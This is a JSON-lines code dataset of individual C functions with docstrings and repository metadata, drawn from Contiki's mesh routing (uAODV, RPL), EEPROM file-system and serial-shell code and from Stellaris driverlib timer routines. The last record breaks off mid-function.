{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static void\nhandle_incoming_rerr(void)", "code": "{\n  struct uaodv_msg_rerr *rm = (struct uaodv_msg_rerr *)uip_appdata;\n  struct uaodv_rt_entry *rt;\n\n  print_debug(\"RERR %d.%d.%d.%d -> %d.%d.%d.%d\"\n\t      \" unreach=%d.%d.%d.%d seq=%lu\\n\",\n\t      uip_ipaddr_to_quad(&BUF->srcipaddr),\n\t      uip_ipaddr_to_quad(&BUF->destipaddr),\n\t      uip_ipaddr_to_quad((uip_ipaddr_t *)&rm->unreach[0]),\n\t      uip_ntohl(rm->unreach[0].seqno));\n\n  if(uip_ipaddr_cmp(&rm->unreach[0].addr, &uip_hostaddr))\n    return;\n\n  rt = uaodv_rt_lookup_any(&rm->unreach[0].addr);\n  if(rt != NULL && uip_ipaddr_cmp(&rt->nexthop, uip_udp_sender())) {\n    if((rm->flags & UAODV_RERR_UNKNOWN) || rm->unreach[0].seqno == 0\n       || SCMP32(rt->hseqno, uip_ntohl(rm->unreach[0].seqno)) <= 0) {\n      rt->is_bad = 1;\n      if(rm->flags & UAODV_RERR_UNKNOWN) {\n\trm->flags &= ~UAODV_RERR_UNKNOWN;\n\trm->unreach[0].seqno = uip_htonl(rt->hseqno);\n      }\n      print_debug(\"RERR rebroadcast\\n\");\n      uip_udp_packet_send(bcastconn, rm, sizeof(struct uaodv_msg_rerr));\n    }\n  }\n}", "path": "core\\net\\uaodv.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static void\nsend_rrep(uip_ipaddr_t *dest, uip_ipaddr_t *nexthop, uip_ipaddr_t *orig,\n\t  u32_t *seqno, unsigned hop_count)", "code": "{\n  struct uaodv_msg_rrep *rm = (struct uaodv_msg_rrep *)uip_appdata;\n  \n  print_debug(\"send RREP orig=%d.%d.%d.%d hops=%d\\n\",\n\t      uip_ipaddr_to_quad(orig), hop_count);\n\n  rm->type = UAODV_RREP_TYPE;\n  rm->flags = 0;\n  rm->prefix_sz = 0;\t\t/* I.e a /32 route. */\n  rm->hop_count = hop_count;\n  uip_ipaddr_copy(&rm->orig_addr, orig);\n  rm->dest_seqno = *seqno;\n  uip_ipaddr_copy(&rm->dest_addr, dest);\n  rm->lifetime = UIP_HTONL(MY_ROUTE_TIMEOUT);\n  sendto(nexthop, rm, sizeof(struct uaodv_msg_rrep));\n}", "path": "core\\net\\uaodv.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static void\nhandle_incoming_rrep(void)", "code": "{\n  struct uaodv_msg_rrep *rm = (struct uaodv_msg_rrep *)uip_appdata;\n  struct uaodv_rt_entry *rt;\n\n  /* Useless HELLO message? */\n  if(uip_ipaddr_cmp(&BUF->destipaddr, &uip_broadcast_addr)) {\n#ifdef AODV_RESPOND_TO_HELLOS\n    u32_t net_seqno;\n#ifdef CC2420_RADIO\n    int ret = cc2420_check_remote(uip_udp_sender()->u16[1]);\n\n    if(ret == REMOTE_YES) {\n      print_debug(\"HELLO drop is remote\\n\");\n      return;\n    } else if (ret == REMOTE_NO) {\n      /* Is neigbour, accept it. */\n    } else if(cc2420_last_rssi < RSSI_THRESHOLD) {\n      print_debug(\"HELLO drop %d %d\\n\", cc2420_last_rssi, cc2420_last_correlation);\n      return;\n    }\n#endif\n    /* Sometimes it helps to send a non-requested RREP in response! */\n    net_seqno = uip_htonl(my_hseqno);\n    send_rrep(&uip_hostaddr, &BUF->srcipaddr, &BUF->srcipaddr, &net_seqno, 0);\n#endif\n    return;\n  }\n\n  print_debug(\"RREP %d.%d.%d.%d -> %d.%d.%d.%d\"\n\t      \" dest=%d.%d.%d.%d seq=%lu hops=%u orig=%d.%d.%d.%d\\n\",\n\t      uip_ipaddr_to_quad(&BUF->srcipaddr),\n\t      uip_ipaddr_to_quad(&BUF->destipaddr),\n\t      uip_ipaddr_to_quad(&rm->dest_addr), uip_ntohl(rm->dest_seqno),\n\t      rm->hop_count,\n\t      uip_ipaddr_to_quad(&rm->orig_addr));\n\n  rt = uaodv_rt_lookup(&rm->dest_addr);\n\n  /* New forward route? */\n  if(rt == NULL || (SCMP32(uip_ntohl(rm->dest_seqno), rt->hseqno) > 0)) {\n    print_debug(\"Inserting3\\n\");\n    rt = uaodv_rt_add(&rm->dest_addr, uip_udp_sender(),\n\t\t      rm->hop_count, &rm->dest_seqno);\n#ifdef CC2420_RADIO\n    /* This link is ok since he is unicasting back to us! */\n    cc2420_recv_ok(uip_udp_sender());\n    print_debug(\"RREP recv ok %d %d\\n\",\n\t\tcc2420_last_rssi, cc2420_last_correlation);\n#endif\n  } else {\n    print_debug(\"Not inserting\\n\");\n  }\n\n  /* Forward RREP towards originator? */\n  if(uip_ipaddr_cmp(&rm->orig_addr, &uip_hostaddr)) {\n    print_debug(\"ROUTE FOUND\\n\");\n    if(rm->flags & UAODV_RREP_ACK) {\n      struct uaodv_msg_rrep_ack *ack = (void *)uip_appdata;\n      ack->type = UAODV_RREP_ACK_TYPE;\n      ack->reserved = 0;\n      sendto(uip_udp_sender(), ack, sizeof(*ack));\n    }\n  } else {\n    rt = uaodv_rt_lookup(&rm->orig_addr);\n\n    if(rt == NULL) {\n      print_debug(\"RREP received, but no route back to originator... :-( \\n\");\n      return;\n    }\n\n    if(rm->flags & UAODV_RREP_ACK) {\n      print_debug(\"RREP with ACK request (ignored)!\\n\");\n      /* Don't want any RREP-ACKs in return! */\n      rm->flags &= ~UAODV_RREP_ACK;\n    }\n\n    rm->hop_count++;\n\n    print_debug(\"Fwd RREP to %d.%d.%d.%d\\n\", uip_ipaddr_to_quad(&rt->nexthop));\n\n    sendto(&rt->nexthop, rm, sizeof(struct uaodv_msg_rrep));\n  }\n}", "path": "core\\net\\uaodv.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/************************************************************************/\n", "func_signal": "static void\nrpl_link_neighbor_callback(const rimeaddr_t *addr, int known, int etx)", "code": "{\n  uip_ipaddr_t ipaddr;\n  rpl_dag_t *dag;\n  rpl_parent_t *parent;\n\n  uip_ip6addr(&ipaddr, 0xfe80, 0, 0, 0, 0, 0, 0, 0);\n  uip_ds6_set_addr_iid(&ipaddr, (uip_lladdr_t *)addr);\n  PRINTF(\"RPL: Neighbor \");\n  PRINT6ADDR(&ipaddr);\n  PRINTF(\" is %sknown. ETX = %u\\n\", known ? \"\" : \"no longer \", NEIGHBOR_INFO_FIX2ETX(etx));\n\n  dag = rpl_get_dag(RPL_DEFAULT_INSTANCE);\n  if(dag == NULL) {\n    return;\n  }\n\n  parent = rpl_find_parent(dag, &ipaddr);\n  if(parent == NULL) {\n    if(!known) {\n      PRINTF(\"RPL: Deleting routes installed by DAOs received from \");\n      PRINT6ADDR(&ipaddr);\n      PRINTF(\"\\n\");\n      uip_ds6_route_rm_by_nexthop(&ipaddr);\n    }\n    return;\n  }\n\n  /* Trigger DAG rank recalculation. */\n  parent->updated = 1;\n\n  parent->link_metric = etx;\n\n  if(dag->of->parent_state_callback != NULL) {\n    dag->of->parent_state_callback(parent, known, etx);\n  }\n\n  if(!known) {\n    PRINTF(\"RPL: Removing parent \");\n    PRINT6ADDR(&parent->addr);\n    PRINTF(\" because of bad connectivity (ETX %d)\\n\", etx);\n    parent->rank = INFINITE_RANK;\n  }\n}", "path": "core\\net\\rpl\\rpl.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/************************************************************************/\n", "func_signal": "uip_ds6_route_t *\nrpl_add_route(rpl_dag_t *dag, uip_ipaddr_t *prefix, int prefix_len,\n              uip_ipaddr_t *next_hop)", "code": "{\n  uip_ds6_route_t *rep;\n\n  rep = uip_ds6_route_lookup(prefix);\n  if(rep == NULL) {\n    if((rep = uip_ds6_route_add(prefix, prefix_len, next_hop, 0)) == NULL) {\n      PRINTF(\"RPL: No space for more route entries\\n\");\n      return NULL;\n    }\n  } else {\n    PRINTF(\"RPL: Updated the next hop for prefix \");\n    PRINT6ADDR(prefix);\n    PRINTF(\" to \");\n    PRINT6ADDR(next_hop);\n    PRINTF(\"\\n\");\n    uip_ipaddr_copy(&rep->nexthop, next_hop);\n  }\n  rep->state.dag = dag;\n  rep->state.lifetime = RPL_LIFETIME(dag, dag->default_lifetime);\n  rep->state.learned_from = RPL_ROUTE_FROM_INTERNAL;\n\n  PRINTF(\"RPL: Added a route to \");\n  PRINT6ADDR(prefix);\n  PRINTF(\"/%d via \", prefix_len);\n  PRINT6ADDR(next_hop);\n  PRINTF(\"\\n\");\n\n  return rep;\n}", "path": "core\\net\\rpl\\rpl.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "int\ncfs_write(int f, const void *buf, unsigned int len)", "code": "{\n  if(f == 1) {\n    eeprom_write(CFS_EEPROM_OFFSET + file.fileptr, (unsigned char *)buf, len);\n    file.fileptr += len;\n    return len;\n  } else {\n    return -1;\n  }\n}", "path": "core\\cfs\\cfs-eeprom.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "PROCESS_THREAD(serial_shell_process, ev, data)", "code": "{\n  PROCESS_BEGIN();\n\n  shell_init();\n  \n  while(1) {\n    PROCESS_WAIT_EVENT_UNTIL(ev == serial_line_event_message && data != NULL);\n    shell_input(data, strlen(data));\n  }\n  \n  PROCESS_END();\n}", "path": "apps\\serial-shell\\serial-shell.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "int\ncfs_open(const char *n, int f)", "code": "{\n  if(file.flag == FLAG_FILE_CLOSED) {\n    file.flag = FLAG_FILE_OPEN;\n    if(f & CFS_READ) {\n      file.fileptr = 0;\n    }\n    if(f & CFS_WRITE){\n      if(f & CFS_APPEND) {\n\tfile.fileptr = file.filesize;\n      } else {\n\tfile.fileptr = 0;\n\tfile.filesize = 0;\n      }\n    }\n    return 1;\n  } else {\n    return -1;\n  }\n}", "path": "core\\cfs\\cfs-eeprom.c", "repo_name": "maniacbug/contiki-avr-zigduino", "stars": 37, "license": "None", "language": "c", "size": 49046}
{"docstring": "//*****************************************************************************\n//\n//! Gets the current 64-bit timer value.\n//!\n//! \\param ulBase is the base address of the timer module.\n//!\n//! This function reads the current value of the specified timer.\n//!\n//! \\return Returns the current value of the timer.\n//\n//*****************************************************************************\n", "func_signal": "unsigned long long\nTimerValueGet64(unsigned long ulBase)", "code": "{\n    unsigned long ulHigh1, ulHigh2, ulLow;\n\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n\n    //\n    // Read the 64-bit timer value.  A read of the low 32-bits is performed\n    // between two reads of the upper 32-bits; if the upper 32-bit values match\n    // then the 64-bit value is consistent.  If they do not match, then the\n    // read is performed again until they do match (it should never execute the\n    // loop body more than twice).\n    //\n    do\n    {\n        ulHigh1 = HWREG(ulBase + TIMER_O_TBR);\n        ulLow = HWREG(ulBase + TIMER_O_TAR);\n        ulHigh2 = HWREG(ulBase + TIMER_O_TBR);\n    }\n    while(ulHigh1 != ulHigh2);\n\n    //\n    // Return the timer value.\n    //\n    return(((unsigned long long)ulHigh1 << 32) | (unsigned long long)ulLow);\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//*****************************************************************************\n//\n//! Enables the timer(s).\n//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param ulTimer specifies the timer(s) to enable; must be one of \\b TIMER_A,\n//! \\b TIMER_B, or \\b TIMER_BOTH.\n//!\n//! This function enables operation of the timer module.  The timer must be\n//! configured before it is enabled.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nTimerEnable(unsigned long ulBase, unsigned long ulTimer)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n    ASSERT((ulTimer == TIMER_A) || (ulTimer == TIMER_B) ||\n           (ulTimer == TIMER_BOTH));\n\n    //\n    // Enable the timer(s) module.\n    //\n    HWREG(ulBase + TIMER_O_CTL) |= ulTimer & (TIMER_CTL_TAEN | TIMER_CTL_TBEN);\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//*****************************************************************************\n//\n//! Controls the stall handling.\n//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param ulTimer specifies the timer(s) to be adjusted; must be one of\n//! \\b TIMER_A, \\b TIMER_B, or \\b TIMER_BOTH.\n//! \\param bStall specifies the response to a stall signal.\n//!\n//! This function controls the stall response for the specified timer.  If the\n//! \\e bStall parameter is \\b true, then the timer stops counting if the\n//! processor enters debug mode; otherwise the timer keeps running while in\n//! debug mode.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nTimerControlStall(unsigned long ulBase, unsigned long ulTimer,\n                  tBoolean bStall)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n    ASSERT((ulTimer == TIMER_A) || (ulTimer == TIMER_B) ||\n           (ulTimer == TIMER_BOTH));\n\n    //\n    // Set the stall mode.\n    //\n    ulTimer &= TIMER_CTL_TASTALL | TIMER_CTL_TBSTALL;\n    HWREG(ulBase + TIMER_O_CTL) = (bStall ?\n                                   (HWREG(ulBase + TIMER_O_CTL) | ulTimer) :\n                                   (HWREG(ulBase + TIMER_O_CTL) & ~(ulTimer)));\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//\n//! Registers an interrupt handler for the timer interrupt.\n//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param ulTimer specifies the timer(s); must be one of \\b TIMER_A,\n//! \\b TIMER_B, or \\b TIMER_BOTH.\n//! \\param pfnHandler is a pointer to the function to be called when the timer\n//! interrupt occurs.\n//!\n//! This function registers the handler to be called when a timer interrupt\n//! occurs. In addition, this function enables the global interrupt in the\n//! interrupt controller; specific timer interrupts must be enabled via\n//! TimerIntEnable(). It is the interrupt handler's responsibility to clear the\n//! interrupt source via TimerIntClear().\n//!\n//! \\sa IntRegister() for important information about registering interrupt\n//! handlers.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nTimerIntRegister(unsigned long ulBase, unsigned long ulTimer,\n                 void (*pfnHandler)(void))", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n    ASSERT((ulTimer == TIMER_A) || (ulTimer == TIMER_B) ||\n           (ulTimer == TIMER_BOTH));\n\n    //\n    // Get the interrupt number for this timer module.\n    //\n    ulBase = TimerIntNumberGet(ulBase);\n\n    //\n    // Register an interrupt handler for timer A if requested.\n    //\n    if(ulTimer & TIMER_A)\n    {\n        //\n        // Register the interrupt handler.\n        //\n        IntRegister(ulBase, pfnHandler);\n\n        //\n        // Enable the interrupt.\n        //\n        IntEnable(ulBase);\n    }\n\n    //\n    // Register an interrupt handler for timer B if requested.\n    //\n    if(ulTimer & TIMER_B)\n    {\n        //\n        // Register the interrupt handler.\n        //\n        IntRegister(ulBase + 1, pfnHandler);\n\n        //\n        // Enable the interrupt.\n        //\n        IntEnable(ulBase + 1);\n    }\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//*****************************************************************************\n//\n//! Enables or disables the ADC trigger output.\n//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param ulTimer specifies the timer to adjust; must be one of \\b TIMER_A,\n//! \\b TIMER_B, or \\b TIMER_BOTH.\n//! \\param bEnable specifies the desired ADC trigger state.\n//!\n//! This function controls the ADC trigger output for the specified timer.  If\n//! the \\e bEnable parameter is \\b true, then the timer's ADC output trigger is\n//! enabled; otherwise it is disabled.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nTimerControlTrigger(unsigned long ulBase, unsigned long ulTimer,\n                    tBoolean bEnable)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n    ASSERT((ulTimer == TIMER_A) || (ulTimer == TIMER_B) ||\n           (ulTimer == TIMER_BOTH));\n\n    //\n    // Set the trigger output as requested.\n    // Set the ADC trigger output as requested.\n    //\n    ulTimer &= TIMER_CTL_TAOTE | TIMER_CTL_TBOTE;\n    HWREG(ulBase + TIMER_O_CTL) = (bEnable ?\n                                   (HWREG(ulBase + TIMER_O_CTL) | ulTimer) :\n                                   (HWREG(ulBase + TIMER_O_CTL) & ~(ulTimer)));\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//*****************************************************************************\n//\n//! Disable RTC counting.\n//!\n//! \\param ulBase is the base address of the timer module.\n//!\n//! This function causes the timer to stop counting when in RTC mode.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nTimerRTCDisable(unsigned long ulBase)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n\n    //\n    // Disable RTC counting.\n    //\n    HWREG(ulBase + TIMER_O_CTL) &= ~(TIMER_CTL_RTCEN);\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//*****************************************************************************\n//\n//! \\internal\n//! Gets the timer interrupt number.\n//!\n//! \\param ulBase is the base address of the timer module.\n//!\n//! Given a timer base address, this function returns the corresponding\n//! interrupt number.\n//!\n//! \\return Returns a timer interrupt number, or -1 if \\e ulBase is invalid.\n//\n//*****************************************************************************\n", "func_signal": "static long\nTimerIntNumberGet(unsigned long ulBase)", "code": "{\n    unsigned long ulIdx;\n\n    //\n    // Loop through the table that maps timer base addresses to interrupt\n    // numbers.\n    //\n    for(ulIdx = 0; ulIdx < (sizeof(g_ppulTimerIntMap) /\n                            sizeof(g_ppulTimerIntMap[0])); ulIdx++)\n    {\n        //\n        // See if this base address matches.\n        //\n        if(g_ppulTimerIntMap[ulIdx][0] == ulBase)\n        {\n            //\n            // Return the corresponding interrupt number.\n            //\n            return(g_ppulTimerIntMap[ulIdx][1]);\n        }\n    }\n\n    //\n    // The base address could not be found, so return an error.\n    //\n    return(-1);\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//*****************************************************************************\n//\n//! Gets the current interrupt status.\n//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param bMasked is false if the raw interrupt status is required and true if\n//! the masked interrupt status is required.\n//!\n//! This function returns the interrupt status for the timer module.  Either\n//! the raw interrupt status or the status of interrupts that are allowed to\n//! reflect to the processor can be returned.\n//!\n//! \\return The current interrupt status, enumerated as a bit field of\n//! values described in TimerIntEnable().\n//\n//*****************************************************************************\n", "func_signal": "unsigned long\nTimerIntStatus(unsigned long ulBase, tBoolean bMasked)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n\n    //\n    // Return either the interrupt status or the raw interrupt status as\n    // requested.\n    //\n    return(bMasked ? HWREG(ulBase + TIMER_O_MIS) :\n           HWREG(ulBase + TIMER_O_RIS));\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//*****************************************************************************\n//\n//! Gets the timer match value for a 64-bit timer.\n//!\n//! \\param ulBase is the base address of the timer module.\n//!\n//! This function gets the match value for the specified timer.\n//!\n//! \\return Returns the match value for the timer.\n//\n//*****************************************************************************\n", "func_signal": "unsigned long long\nTimerMatchGet64(unsigned long ulBase)", "code": "{\n    unsigned long ulHigh1, ulHigh2, ulLow;\n\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n\n    //\n    // Read the 64-bit match value.  A read of the low 32-bits is performed\n    // between two reads of the upper 32-bits; if the upper 32-bit values match\n    // then the 64-bit value is consistent.  If they do not match, then the\n    // read is performed again until they do match (it should never execute the\n    // loop body more than twice).\n    //\n    do\n    {\n        ulHigh1 = HWREG(ulBase + TIMER_O_TBMATCHR);\n        ulLow = HWREG(ulBase + TIMER_O_TAMATCHR);\n        ulHigh2 = HWREG(ulBase + TIMER_O_TBMATCHR);\n    }\n    while(ulHigh1 != ulHigh2);\n\n    //\n    // Return the match value.\n    //\n    return(((unsigned long long)ulHigh1 << 32) | (unsigned long long)ulLow);\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//*****************************************************************************\n//\n//! Disables individual timer interrupt sources.\n//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param ulIntFlags is the bit mask of the interrupt sources to be disabled.\n//!\n//! This function disables the indicated timer interrupt sources.  Only the\n//! sources that are enabled can be reflected to the processor interrupt;\n//! disabled sources have no effect on the processor.\n//!\n//! The \\e ulIntFlags parameter has the same definition as the \\e ulIntFlags\n//! parameter to TimerIntEnable().\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nTimerIntDisable(unsigned long ulBase, unsigned long ulIntFlags)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n\n    //\n    // Disable the specified interrupts.\n    //\n    HWREG(ulBase + TIMER_O_IMR) &= ~(ulIntFlags);\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//*****************************************************************************\n//\n//! Sets the timer load value for a 64-bit timer.\n//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param ullValue is the load value.\n//!\n//! This function configures the timer load value for a 64-bit timer; if the\n//! timer is running, then the value is immediately loaded into the timer.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nTimerLoadSet64(unsigned long ulBase, unsigned long long ullValue)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n\n    //\n    // Set the timer load value.  The upper 32-bits must be written before the\n    // lower 32-bits in order to adhere to the hardware interlocks on the\n    // 64-bit value.\n    //\n    HWREG(ulBase + TIMER_O_TBILR) = ullValue >> 32;\n    HWREG(ulBase + TIMER_O_TAILR) = ullValue & 0xffffffff;\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//*****************************************************************************\n//\n//! Sets the timer match value for a 64-bit timer.\n//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param ullValue is the match value.\n//!\n//! This function configures the match value for a timer.  This value is used\n//! in capture count mode to determine when to interrupt the processor and in\n//! PWM mode to determine the duty cycle of the output signal.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nTimerMatchSet64(unsigned long ulBase, unsigned long long ullValue)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n\n    //\n    // Set the timer match value.  The upper 32-bits must be written before the\n    // lower 32-bits in order to adhere to the hardware interlocks on the\n    // 64-bit value.\n    //\n    HWREG(ulBase + TIMER_O_TBMATCHR) = ullValue >> 32;\n    HWREG(ulBase + TIMER_O_TAMATCHR) = ullValue & 0xffffffff;\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//! full-width mode, only the A timer can be synchronized (specifying the B\n//! timer has no effect).\n//!\n//! The \\e ulTimers parameter is the logical OR of any of the following\n//! defines:\n//!\n//! - \\b TIMER_0A_SYNC\n//! - \\b TIMER_0B_SYNC\n//! - \\b TIMER_1A_SYNC\n//! - \\b TIMER_1B_SYNC\n//! - \\b TIMER_2A_SYNC\n//! - \\b TIMER_2B_SYNC\n//! - \\b TIMER_3A_SYNC\n//! - \\b TIMER_3B_SYNC\n//! - \\b TIMER_4A_SYNC\n//! - \\b TIMER_4B_SYNC\n//! - \\b TIMER_5A_SYNC\n//! - \\b TIMER_5B_SYNC\n//! - \\b WTIMER_0A_SYNC\n//! - \\b WTIMER_0B_SYNC\n//! - \\b WTIMER_1A_SYNC\n//! - \\b WTIMER_1B_SYNC\n//! - \\b WTIMER_2A_SYNC\n//! - \\b WTIMER_2B_SYNC\n//! - \\b WTIMER_3A_SYNC\n//! - \\b WTIMER_3B_SYNC\n//! - \\b WTIMER_4A_SYNC\n//! - \\b WTIMER_4B_SYNC\n//! - \\b WTIMER_5A_SYNC\n//! - \\b WTIMER_5B_SYNC\n//!\n//! \\note This functionality is not available on all parts.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nTimerSynchronize(unsigned long ulBase, unsigned long ulTimers)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(ulBase == TIMER0_BASE);\n\n    //\n    // Synchronize the specified timers.\n    //\n    HWREG(ulBase + TIMER_O_SYNC) = ulTimers;\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param ulTimer specifies the timer; must be one of \\b TIMER_A or\n//! \\b TIMER_B.\n//!\n//! This function gets the value of the input clock prescaler match value.\n//! When in a half-width mode that uses the counter match and prescaler, the\n//! prescale match effectively extends the range of the match. The prescaler\n//! provides the least significant bits when counting down in periodic and\n//! one-shot modes; in all other modes, the prescaler provides the most\n//! significant bits.\n//!\n//! \\note The availability of the prescaler match varies with the Stellaris\n//! part and timer mode in use.  Please consult the datasheet for the part you\n//! are using to determine whether this support is available.\n//!\n//! \\return The value of the timer prescale match.\n//\n//*****************************************************************************\n", "func_signal": "unsigned long\nTimerPrescaleMatchGet(unsigned long ulBase, unsigned long ulTimer)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n    ASSERT((ulTimer == TIMER_A) || (ulTimer == TIMER_B) ||\n           (ulTimer == TIMER_BOTH));\n\n    //\n    // Return the appropriate prescale match value.\n    //\n    return((ulTimer == TIMER_A) ? HWREG(ulBase + TIMER_O_TAPMR) :\n           HWREG(ulBase + TIMER_O_TBPMR));\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//*****************************************************************************\n//\n//! Gets the current timer value.\n//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param ulTimer specifies the timer; must be one of \\b TIMER_A or\n//! \\b TIMER_B.  Only \\b TIMER_A should be used when the timer is configured\n//! for full-width operation.\n//!\n//! This function reads the current value of the specified timer.\n//!\n//! \\note This function can be used for both full- and half-width modes of\n//! 16/32-bit timers and for half-width modes of 32/64-bit timers.  Use\n//! TimerValueGet64() for full-width modes of 32/64-bit timers.\n//!\n//! \\return Returns the current value of the timer.\n//\n//*****************************************************************************\n", "func_signal": "unsigned long\nTimerValueGet(unsigned long ulBase, unsigned long ulTimer)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n    ASSERT((ulTimer == TIMER_A) || (ulTimer == TIMER_B));\n\n    //\n    // Return the appropriate timer value.\n    //\n    return((ulTimer == TIMER_A) ? HWREG(ulBase + TIMER_O_TAR) :\n           HWREG(ulBase + TIMER_O_TBR));\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//\n//! Controls the wait on trigger handling.\n//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param ulTimer specifies the timer(s) to be adjusted; must be one of\n//! \\b TIMER_A, \\b TIMER_B, or \\b TIMER_BOTH.\n//! \\param bWait specifies if the timer should wait for a trigger input.\n//!\n//! This function controls whether or not a timer waits for a trigger input to\n//! start counting.  When enabled, the previous timer in the trigger chain must\n//! count to its timeout in order for this timer to start counting.  Refer to\n//! the part's data sheet for a description of the trigger chain.\n//!\n//! \\note This functionality is not available on all parts.  This function\n//! should not be used for Timer 0A or Wide Timer 0A.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nTimerControlWaitOnTrigger(unsigned long ulBase, unsigned long ulTimer,\n                          tBoolean bWait)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n    ASSERT((ulTimer == TIMER_A) || (ulTimer == TIMER_B) ||\n           (ulTimer == TIMER_BOTH));\n\n    //\n    // Set the wait on trigger mode for timer A.\n    //\n    if((ulTimer & TIMER_A) != 0)\n    {\n        if(bWait)\n        {\n            HWREG(ulBase + TIMER_O_TAMR) |= TIMER_TAMR_TAWOT;\n        }\n        else\n        {\n            HWREG(ulBase + TIMER_O_TAMR) &= ~(TIMER_TAMR_TAWOT);\n        }\n    }\n\n    //\n    // Set the wait on trigger mode for timer B.\n    //\n    if((ulTimer & TIMER_B) != 0)\n    {\n        if(bWait)\n        {\n            HWREG(ulBase + TIMER_O_TBMR) |= TIMER_TBMR_TBWOT;\n        }\n        else\n        {\n            HWREG(ulBase + TIMER_O_TBMR) &= ~(TIMER_TBMR_TBWOT);\n        